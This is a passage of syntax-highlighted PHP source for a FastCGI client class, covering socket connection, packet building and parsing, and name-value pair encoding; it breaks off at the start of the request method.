operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span>boolean<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">/* version */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">/* type */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* requestIdB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">/* requestIdB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">/* contentLengthB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">/* contentLengthB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">/* paddingLength */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">/* reserved */</span>            <span class="token punctuation">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">/* content */</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$len</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getValues</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//     